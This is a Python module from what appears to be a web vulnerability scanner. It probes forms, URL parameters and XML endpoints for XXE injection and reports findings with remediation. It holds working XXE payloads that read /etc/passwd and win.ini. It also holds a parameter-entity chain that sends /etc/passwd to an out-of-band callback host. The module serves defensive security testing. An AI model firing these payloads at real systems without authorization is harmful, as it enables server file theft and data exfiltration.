import httpx
import time
from typing import List
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.http import get_url_params, inject_url_param
from scanner.utils.payloads import load_payloads

UNIX_SIGNATURES = ["root:x:", "root:/root:", "/bin/bash", "daemon:x:"]
WIN_SIGNATURES = ["[extensions]", "[fonts]", "for 16-bit app support"]

_HARDCODED = [
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        UNIX_SIGNATURES,
        "/etc/passwd read",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
        WIN_SIGNATURES,
        "win.ini read",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root/>',
        UNIX_SIGNATURES,
        "/etc/passwd via parameter entity",
    ),
]

def _get_payloads() -> List[tuple]:
    data = load_payloads("xxe")
    if data and isinstance(data.get("payloads"), list):
        try:
            result = []
            for p in data["payloads"]:
                sigs = UNIX_SIGNATURES if p.get("target") == "unix" else WIN_SIGNATURES
                result.append((p["payload"], sigs, p["label"]))
            return result
        except (KeyError, TypeError):
            pass
    return _HARDCODED

XXE_PAYLOADS = _get_payloads()

# Content types that indicate XML-accepting endpoints
XML_CONTENT_TYPES = {"application/xml", "text/xml", "application/xhtml+xml", "application/soap+xml"}

# URL params whose names hint at XML content
_XML_HINT_PARAMS = {"xml", "data", "body", "payload", "input", "query", "request", "content"}

# Timing-based XXE: reference an unreachable private IP so the parser's connection
# attempt blocks until its TCP timeout fires — detectable as a response-time delta.
_XXE_TIMING_URL = "http://10.255.255.1:7777/"
_XXE_TIMING_DELAY = 3.0   # minimum delta (seconds) to confirm external-entity fetching
_XXE_TIMING_PAYLOADS = [
    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{_XXE_TIMING_URL}">]><root>&xxe;</root>',
    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{_XXE_TIMING_URL}"> %xxe;]><root/>',
]


def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
    findings = []

    # Phase 1: OOB (blind) — PRIMARY method when interactsh is configured.
    # Modern apps never echo file content so visible detection rarely works.
    if oob:
        _test_oob(page, client, oob, findings)

    # Phase 1.5: Timing-based — works WITHOUT OOB server.
    # Injects a reference to an unreachable private IP; if the parser fetches it,
    # the response is delayed by the TCP connect timeout (detectable as a delta).
    if not findings:
        _test_timing_xxe(page, client, findings)

    # Phase 2: Visible file-read — works on legacy/debug apps that echo content
    if not findings:
        _test_visible_forms(page, client, findings)
        _test_visible_params(page, client, findings)
        _test_visible_body(page, client, findings)

    # Phase 3: Blind POST probe — catch-all for JS-invoked XML endpoints
    # (XHR/fetch calls not visible to the static crawler).
    if not findings:
        _test_blind_post(page, client, findings)

    return findings


def _test_timing_xxe(page: CrawlResult, client: httpx.Client, findings: List[Finding]) -> None:
    """Timing-based XXE: detects external-entity fetching without an OOB server.

    Sends XML with an entity reference to an unreachable private IP. If the parser
    processes external entities, the TCP connection attempt blocks until timeout —
    observed as a response-time delta vs a benign XML baseline. Two consecutive
    slow probes are required to eliminate false positives from transient latency.
    """
    # Build a list of surfaces to probe: discovered forms + XML-typed URL + blind POST
    surfaces: list = []
    for form in page.forms:
        surfaces.append(("form", form))
    content_type = page.headers.get("content-type", "")
    if any(ct in content_type for ct in XML_CONTENT_TYPES):
        surfaces.append(("url", None))
    if not surfaces:
        surfaces.append(("blind", None))

    _benign_xml = '<?xml version="1.0"?><root>kagesec</root>'

    for surface_type, form in surfaces:
        action = form["action"] if surface_type == "form" else page.url
        method = form["method"].upper() if surface_type == "form" else "POST"

        # Baseline: benign XML that the parser returns immediately
        try:
            t0 = time.time()
            client.request(method, action, content=_benign_xml,
                           headers={"Content-Type": "application/xml"}, timeout=14)
            baseline_time = time.time() - t0
        except Exception:
            baseline_time = 0.0

        for payload in _XXE_TIMING_PAYLOADS:
            probe_times = []
            for _ in range(2):
                try:
                    t0 = time.time()
                    client.request(method, action, content=payload,
                                   headers={"Content-Type": "application/xml"}, timeout=14)
                    probe_times.append(max(time.time() - t0 - baseline_time, 0.0))
                except Exception:
                    probe_times.append(14.0)   # timeout itself is evidence of blocking

            if len(probe_times) == 2 and all(t >= _XXE_TIMING_DELAY for t in probe_times):
                findings.append(_finding(
                    action, None, payload,
                    label="timing-based external entity probe",
                    matched=(
                        f"both probes delayed >{_XXE_TIMING_DELAY}s "
                        f"({probe_times[0]:.1f}s, {probe_times[1]:.1f}s) "
                        f"vs {baseline_time:.2f}s benign-XML baseline"
                    ),
                ))
                return


def _test_oob(page: CrawlResult, client: httpx.Client, oob, findings: List[Finding]) -> None:
    """OOB blind XXE via DNS/HTTP callback — primary detection for modern apps."""
    try:
        canary = oob.get_canary()
    except Exception:
        return

    oob_payloads = [
        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{canary}/xxe">]><root>&xxe;</root>',
        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{canary}/xxe-param"> %xxe;]><root/>',
        # DTD-based exfil via error channel (works on parsers that block SYSTEM entities)
        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{canary}/?x=%file;\'>">%eval;%exfil;]><root/>',
    ]

    # Test every form with XML POST
    for form in page.forms:
        for oob_payload in oob_payloads:
            try:
                client.request(
                    form["method"].upper(), form["action"],
                    content=oob_payload,
                    headers={"Content-Type": "application/xml"}, timeout=8,
                )
            except Exception:
                pass

    # Test XML-typed response body endpoints
    content_type = page.headers.get("content-type", "")
    if any(ct in content_type for ct in XML_CONTENT_TYPES):
        for oob_payload in oob_payloads:
            try:
                client.post(
                    page.url, content=oob_payload,
                    headers={"Content-Type": "application/xml"}, timeout=8,
                )
            except Exception:
                pass

    # Blind POST probe to any URL (catches JS-invoked XML endpoints)
    for oob_payload in oob_payloads[:2]:
        try:
            client.post(
                page.url, content=oob_payload,
                headers={"Content-Type": "application/xml"}, timeout=8,
            )
        except Exception:
            pass

    # OOB findings are reported by the OOB server poller in the engine post-processing phase.
    # We don't append a finding here — the interactsh callback creates it.


def _test_visible_forms(page: CrawlResult, client: httpx.Client, findings: List[Finding]) -> None:
    for form in page.forms:
        for payload, signatures, label in XXE_PAYLOADS:
            try:
                resp = client.request(
                    form["method"].upper(),
                    form["action"],
                    content=payload,
                    headers={"Content-Type": "application/xml"},
                )
            except Exception:
                continue
            matched = next((s for s in signatures if s in resp.text), None)
            if matched:
                findings.append(_finding(form["action"], None, payload, label, matched))
                break


def _test_visible_params(page: CrawlResult, client: httpx.Client, findings: List[Finding]) -> None:
    params = get_url_params(page.url)
    for param_name in params:
        if param_name.lower() not in _XML_HINT_PARAMS:
            continue
        for payload, signatures, label in XXE_PAYLOADS:
            test_url = inject_url_param(page.url, param_name, payload)
            try:
                resp = client.get(test_url)
            except Exception:
                continue
            matched = next((s for s in signatures if s in resp.text), None)
            if matched:
                findings.append(_finding(page.url, param_name, payload, label, matched))
                break


def _test_visible_body(page: CrawlResult, client: httpx.Client, findings: List[Finding]) -> None:
    content_type = page.headers.get("content-type", "")
    if not any(ct in content_type for ct in XML_CONTENT_TYPES):
        return
    for payload, signatures, label in XXE_PAYLOADS:
        try:
            resp = client.post(
                page.url,
                content=payload,
                headers={"Content-Type": "application/xml"},
            )
        except Exception:
            continue
        matched = next((s for s in signatures if s in resp.text), None)
        if matched:
            findings.append(_finding(page.url, None, payload, label, matched))
            break


def _test_blind_post(page: CrawlResult, client: httpx.Client, findings: List[Finding]) -> None:
    """Blind XML POST to any crawled URL — catch-all for JS-called XML endpoints."""
    for payload, signatures, label in XXE_PAYLOADS[:2]:
        try:
            resp = client.post(
                page.url, content=payload,
                headers={"Content-Type": "application/xml"}, timeout=10,
            )
        except Exception:
            break
        matched = next((s for s in signatures if s in resp.text), None)
        if matched:
            findings.append(_finding(page.url, None, payload, label, matched))
            break


def _finding(url: str, param, payload: str, label: str, matched: str) -> Finding:
    return Finding(
        title="XML External Entity (XXE) Injection",
        severity=Severity.CRITICAL,
        url=url,
        parameter=param,
        payload=payload[:80] + "...",
        evidence=f"XXE payload triggered file read ({label}). Content signature '{matched}' found in response.",
        description=(
            "XXE allows attackers to read arbitrary files from the server, perform SSRF, "
            "and in some cases achieve remote code execution via Java/PHP deserialization chains."
        ),
        remediation=(
            "Disable external entity processing in your XML parser. "
            "Use a safe XML parser configuration (e.g., defusedxml in Python). "
            "Prefer JSON over XML for APIs."
        ),
        cwe="CWE-611",
        cvss=9.1,
        owasp_category="A03:2021 Injection",
        standards=["ISO27001-8.23", "HIPAA-164.312a"],
        confidence=1.0,
    )
